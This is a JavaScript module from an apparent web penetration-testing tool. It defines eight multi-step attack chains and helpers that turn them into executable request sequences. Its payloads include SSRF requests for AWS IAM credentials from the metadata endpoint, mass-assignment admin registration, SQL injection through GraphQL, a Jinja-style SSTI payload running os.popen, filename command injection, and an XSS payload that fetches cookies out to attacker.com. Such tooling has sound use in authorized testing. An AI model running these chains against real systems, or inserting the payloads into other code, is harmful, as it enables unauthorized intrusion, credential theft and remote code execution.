/**
 * Security Attack Chains
 * Pre-built multi-step vulnerability chains for comprehensive testing
 */

/**
 * Auth-to-IDOR chain: Login and extract token, then test IDOR
 */
const AUTH_TO_IDOR_CHAIN = {
  name: 'Authentication to IDOR Escalation',
  description: 'Authenticate user, extract session token, then test IDOR on protected resources',
  vector: 'IDOR',
  steps: [
    {
      step: 1,
      name: 'Authenticate user',
      method: 'POST',
      url: '/api/auth/login',
      body: '{"username":"testuser","password":"testpass"}',
      vector: 'AuthBypass',
      extract: {
        token: 'json.token',
        userId: 'json.user.id'
      },
      condition: 'status === 200'
    },
    {
      step: 2,
      name: 'Test IDOR with extracted token',
      method: 'GET',
      url: '/api/users/${userId}',
      headers: [
        { k: 'Authorization', v: 'Bearer ${token}' }
      ],
      vector: 'IDOR',
      params: [
        { k: 'id', v: '${userId+1}' }
      ],
      hypothesis: "Access to another user's data with valid session"
    },
    {
      step: 3,
      name: 'Test IDOR with invalid token',
      method: 'GET',
      url: '/api/users/${userId}',
      headers: [
        { k: 'Authorization', v: 'Bearer invalid_token' }
      ],
      vector: 'AuthBypass',
      hypothesis: 'Authorization enforcement check'
    }
  ],
  safety_tier: 'safe',
  prerequisites: ['Valid test credentials']
};

/**
 * Upload-to-RCE chain: File upload, path traversal, then command injection
 */
const UPLOAD_TO_RCE_CHAIN = {
  name: 'File Upload to Remote Code Execution',
  description: 'Upload file with path traversal, then inject command via filename',
  vector: 'CommandInjection',
  steps: [
    {
      step: 1,
      name: 'Upload file with normal name',
      method: 'POST',
      url: '/api/upload',
      headers: [
        { k: 'Content-Type', v: 'multipart/form-data' }
      ],
      body: 'file=test.txt',
      vector: 'UnrestrictedUpload',
      extract: {
        filePath: 'json.path'
      },
      condition: 'status === 200'
    },
    {
      step: 2,
      name: 'Upload with path traversal',
      method: 'POST',
      url: '/api/upload',
      body: 'file=../../../tmp/test.txt',
      vector: 'PathTraversal',
      hypothesis: 'File written outside upload directory'
    },
    {
      step: 3,
      name: 'Upload with command injection in filename',
      method: 'POST',
      url: '/api/upload',
      body: 'file=test;id.txt',
      vector: 'CommandInjection',
      hypothesis: 'Command execution in error response or timing'
    }
  ],
  safety_tier: 'controlled-mutation',
  prerequisites: ['File upload endpoint identified']
};

/**
 * SSRF-to-Metadata chain: URL injection to cloud metadata access
 */
const SSRF_TO_METADATA_CHAIN = {
  name: 'SSRF to Cloud Metadata Extraction',
  description: 'Inject SSRF payload to access cloud provider metadata endpoints',
  vector: 'SSRF',
  steps: [
    {
      step: 1,
      name: 'Test basic URL fetch',
      method: 'POST',
      url: '/api/fetch-url',
      body: '{"url":"http://example.com"}',
      vector: 'SSRF',
      condition: 'status === 200'
    },
    {
      step: 2,
      name: 'Access AWS metadata',
      method: 'POST',
      url: '/api/fetch-url',
      body: '{"url":"http://169.254.169.254/latest/meta-data/"}',
      vector: 'SSRF',
      hypothesis: 'AWS metadata endpoint accessible'
    },
    {
      step: 3,
      name: 'Access AWS credentials',
      method: 'POST',
      url: '/api/fetch-url',
      body: '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
      vector: 'SSRF',
      hypothesis: 'IAM role credentials exposed'
    },
    {
      step: 4,
      name: 'Access GCP metadata',
      method: 'POST',
      url: '/api/fetch-url',
      headers: [
        { k: 'Metadata-Flavor', v: 'Google' }
      ],
      body: '{"url":"http://metadata.google.internal/computeMetadata/v1/"}',
      vector: 'SSRF',
      hypothesis: 'GCP metadata endpoint accessible'
    }
  ],
  safety_tier: 'controlled-mutation',
  prerequisites: ['URL fetch functionality identified']
};

/**
 * Mass Assignment to Privilege Escalation chain
 */
const MASS_ASSIGNMENT_TO_PRIVESC_CHAIN = {
  name: 'Mass Assignment Privilege Escalation',
  description: 'Register user with admin role, then verify privilege escalation',
  vector: 'MassAssignment',
  steps: [
    {
      step: 1,
      name: 'Register with role injection',
      method: 'POST',
      url: '/api/auth/register',
      body: '{"username":"attacker","password":"P@ssw0rd!","email":"attacker@test.com","role":"admin","isAdmin":true}',
      vector: 'MassAssignment',
      extract: {
        token: 'json.token',
        userId: 'json.id'
      },
      condition: 'status === 200'
    },
    {
      step: 2,
      name: 'Access admin endpoint',
      method: 'GET',
      url: '/api/admin/users',
      headers: [
        { k: 'Authorization', v: 'Bearer ${token}' }
      ],
      vector: 'AuthBypass',
      hypothesis: 'Admin endpoint accessible with injected role'
    },
    {
      step: 3,
      name: 'Verify admin privileges',
      method: 'GET',
      url: '/api/users/${userId}',
      headers: [
        { k: 'Authorization', v: 'Bearer ${token}' }
      ],
      vector: 'IDOR',
      hypothesis: 'User object shows admin role'
    }
  ],
  safety_tier: 'controlled-mutation',
  prerequisites: ['User registration endpoint']
};

/**
 * XSS to Session Hijack chain
 */
const XSS_TO_SESSION_HIJACK_CHAIN = {
  name: 'XSS Session Hijacking',
  description: 'Inject persistent XSS, then simulate session cookie exfiltration',
  vector: 'XSS',
  steps: [
    {
      step: 1,
      name: 'Inject reflected XSS',
      method: 'GET',
      url: '/api/search?q=<script>alert(1)</script>',
      vector: 'XSS',
      hypothesis: 'XSS payload reflected in response'
    },
    {
      step: 2,
      name: 'Inject stored XSS',
      method: 'POST',
      url: '/api/comments',
      body: '{"comment":"<script>alert(document.cookie)</script>"}',
      vector: 'XSS',
      hypothesis: 'XSS payload stored and rendered'
    },
    {
      step: 3,
      name: 'Cookie exfiltration simulation',
      method: 'POST',
      url: '/api/profile',
      body: '{"bio":"<img src=x onerror=fetch(\"http://attacker.com/steal?c=\"+document.cookie)>"}',
      vector: 'XSS',
      hypothesis: 'Cookie would be sent to attacker domain'
    }
  ],
  safety_tier: 'safe',
  prerequisites: ['User-controllable input reflected or stored']
};

/**
 * Rate Limit Bypass chain
 */
const RATE_LIMIT_BYPASS_CHAIN = {
  name: 'Rate Limit Bypass Techniques',
  description: 'Test various rate limit bypass strategies',
  vector: 'RateLimit',
  steps: [
    {
      step: 1,
      name: 'Baseline rate limit test',
      method: 'POST',
      url: '/api/login',
      body: '{"username":"test","password":"wrong"}',
      vector: 'RateLimit',
      hypothesis: 'Establish baseline rate limiting'
    },
    {
      step: 2,
      name: 'X-Forwarded-For bypass',
      method: 'POST',
      url: '/api/login',
      headers: [
        { k: 'X-Forwarded-For', v: '1.1.1.1' }
      ],
      body: '{"username":"test","password":"wrong"}',
      vector: 'RateLimit',
      hypothesis: 'Rate limit bypass via IP header'
    },
    {
      step: 3,
      name: 'Parameter variation bypass',
      method: 'POST',
      url: '/api/login',
      body: '{"username":"test","password":"wrong1"}',
      vector: 'RateLimit',
      hypothesis: 'Rate limit keyed on username only'
    },
    {
      step: 4,
      name: 'Distributed timing test',
      method: 'POST',
      url: '/api/login',
      body: '{"username":"test","password":"wrong2"}',
      vector: 'RateLimit',
      hypothesis: 'Rate limit reset after time window'
    }
  ],
  safety_tier: 'safe',
  prerequisites: ['Rate-limited endpoint identified']
};

/**
 * GraphQL Introspection to Injection chain
 */
const GRAPHQL_INTROSPECTION_TO_INJECTION_CHAIN = {
  name: 'GraphQL Introspection to Injection',
  description: 'Extract schema via introspection, then test injection on discovered fields',
  vector: 'GraphQLInjection',
  steps: [
    {
      step: 1,
      name: 'GraphQL introspection',
      method: 'POST',
      url: '/graphql',
      headers: [
        { k: 'Content-Type', v: 'application/json' }
      ],
      body: '{"query":"{__schema{types{name fields{name type{name}}}}}"}',
      vector: 'GraphQLInjection',
      extract: {
        schema: 'json.data.__schema'
      },
      hypothesis: 'Schema information disclosed'
    },
    {
      step: 2,
      name: 'Test user field injection',
      method: 'POST',
      url: '/graphql',
      body: '{"query":"{user(id:\\\'\\\' OR \\\'1\\\'=\\\'1){id email password}}"}',
      vector: 'GraphQLInjection',
      hypothesis: 'SQL injection via GraphQL argument'
    },
    {
      step: 3,
      name: 'Deep nested query DoS',
      method: 'POST',
      url: '/graphql',
      body: '{"query":"{user{id friends{id friends{id friends{id}}}}}"}',
      vector: 'GraphQLInjection',
      hypothesis: 'Query depth limitation test'
    }
  ],
  safety_tier: 'safe',
  prerequisites: ['GraphQL endpoint identified']
};

/**
 * SSTI to RCE chain
 */
const SSTI_TO_RCE_CHAIN = {
  name: 'SSTI to Remote Code Execution',
  description: 'Detect SSTI via arithmetic, then escalate to command execution',
  vector: 'SSTI',
  steps: [
    {
      step: 1,
      name: 'SSTI arithmetic detection',
      method: 'GET',
      url: '/api/greeting?name={{7*7}}',
      vector: 'SSTI',
      hypothesis: 'Arithmetic expression evaluated (49)'
    },
    {
      step: 2,
      name: 'SSTI config access',
      method: 'GET',
      url: '/api/greeting?name={{config}}',
      vector: 'SSTI',
      hypothesis: 'Application config exposed'
    },
    {
      step: 3,
      name: 'SSTI command execution',
      method: 'POST',
      url: '/api/template',
      body: '{"template":"{{config.__class__.__init__.__globals__[\\\'os\\\'].popen(\\\'id\\\').read()}}"}',
      vector: 'SSTI',
      hypothesis: 'Command execution via template engine'
    }
  ],
  safety_tier: 'high-risk',
  prerequisites: ['Template rendering functionality', 'SSTI confirmed via arithmetic'],
  warnings: ['Do not execute on production systems', 'Requires explicit authorization']
};

/**
 * Chain registry
 */
const ATTACK_CHAINS = {
  'auth-to-idor': AUTH_TO_IDOR_CHAIN,
  'upload-to-rce': UPLOAD_TO_RCE_CHAIN,
  'ssrf-to-metadata': SSRF_TO_METADATA_CHAIN,
  'mass-assignment-to-privesc': MASS_ASSIGNMENT_TO_PRIVESC_CHAIN,
  'xss-to-session-hijack': XSS_TO_SESSION_HIJACK_CHAIN,
  'rate-limit-bypass': RATE_LIMIT_BYPASS_CHAIN,
  'graphql-introspection-to-injection': GRAPHQL_INTROSPECTION_TO_INJECTION_CHAIN,
  'ssti-to-rce': SSTI_TO_RCE_CHAIN
};

/**
 * Get attack chain for a specific vector
 * @param {string} vector - Vulnerability vector
 * @returns {Object|null} Attack chain or null
 */
function getAttackChainForVector(vector) {
  const vectorChains = {
    'IDOR': ['auth-to-idor'],
    'CommandInjection': ['upload-to-rce'],
    'SSRF': ['ssrf-to-metadata'],
    'MassAssignment': ['mass-assignment-to-privesc'],
    'XSS': ['xss-to-session-hijack'],
    'RateLimit': ['rate-limit-bypass'],
    'GraphQLInjection': ['graphql-introspection-to-injection'],
    'SSTI': ['ssti-to-rce']
  };
  
  const chainIds = vectorChains[vector];
  if (!chainIds || !chainIds.length) return null;
  
  return ATTACK_CHAINS[chainIds[0]] || null;
}

/**
 * Get all available attack chains
 * @returns {Object} All attack chains
 */
function getAllAttackChains() {
  return ATTACK_CHAINS;
}

/**
 * Build executable probe chain from attack chain
 * @param {Object} chain - Attack chain definition
 * @param {Object} context - Execution context (baseUrl, tokens, etc.)
 * @returns {Object} Executable probe chain action
 */
function buildExecutableChain(chain, context = {}) {
  const { baseUrl = '', tokens = {}, extractedValues = {} } = context;
  
  const executableSteps = chain.steps.map(step => {
    // Resolve template variables
    let url = typeof step.url === 'string' ? step.url : '';
    let body = typeof step.body === 'string' ? step.body : '';
    let headers = Array.isArray(step.headers) ? step.headers : [];
    
    // Replace ${variable} placeholders
    Object.entries({ ...tokens, ...extractedValues }).forEach(([key, value]) => {
      const regex = new RegExp(`\\$\\{${key}\\}`, 'g');
      url = url.replace(regex, String(value));
      body = body.replace(regex, String(value));
      headers = headers.map(h => ({
        k: h.k,
        v: String(h.v || '').replace(regex, String(value))
      }));
    });
    
    // Prepend base URL
    if (baseUrl && url.startsWith('/')) {
      url = baseUrl + url;
    }
    
    return {
      step: step.step,
      name: step.name,
      method: step.method,
      url,
      headers,
      body,
      vector: step.vector,
      hypothesis: step.hypothesis,
      extract: step.extract || null,
      condition: step.condition || null
    };
  });
  
  return {
    type: 'probe_chain',
    name: chain.name,
    steps: executableSteps,
    safety_tier: chain.safety_tier,
    prerequisites: chain.prerequisites,
    warnings: chain.warnings || []
  };
}

/**
 * Validate attack chain prerequisites
 * @param {Object} chain - Attack chain definition
 * @param {Object} context - Current context
 * @returns {Object} Validation result
 */
function validateChainPrerequisites(chain, context = {}) {
  const missing = [];
  
  if (Array.isArray(chain.prerequisites)) {
    chain.prerequisites.forEach(prereq => {
      const prereqLower = prereq.toLowerCase();
      
      if (prereqLower.includes('credential') && !context.credentials) {
        missing.push(prereq);
      }
      if (prereqLower.includes('token') && !context.tokens) {
        missing.push(prereq);
      }
      if (prereqLower.includes('endpoint') && !context.endpoint) {
        missing.push(prereq);
      }
      if (prereqLower.includes('confirmed') && !context.confirmed) {
        missing.push(prereq);
      }
    });
  }
  
  return {
    valid: missing.length === 0,
    missing_prerequisites: missing,
    can_execute: missing.length === 0
  };
}

module.exports = {
  AUTH_TO_IDOR_CHAIN,
  UPLOAD_TO_RCE_CHAIN,
  SSRF_TO_METADATA_CHAIN,
  MASS_ASSIGNMENT_TO_PRIVESC_CHAIN,
  XSS_TO_SESSION_HIJACK_CHAIN,
  RATE_LIMIT_BYPASS_CHAIN,
  GRAPHQL_INTROSPECTION_TO_INJECTION_CHAIN,
  SSTI_TO_RCE_CHAIN,
  ATTACK_CHAINS,
  getAttackChainForVector,
  getAllAttackChains,
  buildExecutableChain,
  validateChainPrerequisites
};
